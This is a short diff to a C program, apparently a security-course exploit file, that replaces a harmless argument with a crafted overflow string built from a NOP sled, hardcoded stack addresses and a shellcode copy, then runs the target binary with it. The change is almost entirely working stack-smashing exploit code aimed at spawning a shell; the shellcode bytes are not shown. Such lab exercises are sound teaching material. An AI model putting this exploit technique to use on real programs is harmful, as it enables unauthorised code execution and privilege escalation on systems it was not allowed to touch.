@@ -9,7 +9,16 @@
 
 int main(void)
 {
-  char *args[] = { TARGET, "hi there", NULL };
+  char sploitstring[201];
+  memset(sploitstring, '\x90', sizeof(sploitstring));
+  sploitstring[200] = 0;
+  
+  int offset = 0xbffffd00 - 0xbffffcc8;
+  *(int *) (sploitstring + offset) = 0xffffffff;
+  *(int *) (sploitstring + offset + 4) = 0xbffffd00 + 4 + 4;
+  memcpy(sploitstring + offset + 4 + 4, shellcode, strlen(shellcode)); 
+
+  char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
 
   execve(TARGET, args, env);
@@ -17,3 +26,4 @@ int main(void)
 
   return 0;
 }
+
